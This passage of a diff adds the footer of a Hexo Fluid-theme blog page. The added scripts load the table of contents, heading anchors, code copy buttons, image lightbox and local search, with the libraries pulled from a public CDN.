+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
